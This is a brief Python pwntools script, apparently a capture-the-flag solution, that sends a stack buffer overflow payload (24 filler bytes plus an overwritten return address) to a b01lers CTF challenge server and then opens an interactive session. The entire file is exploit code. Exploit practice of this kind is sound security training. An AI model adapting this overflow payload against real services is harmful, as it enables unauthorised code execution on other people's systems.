from pwn import *

payload = 'A'*24+p64(0x0000000000401196)

p = remote('chal.ctf.b01lers.com', 1015)
print p.recv()
p.sendline(payload)
p.interactive()
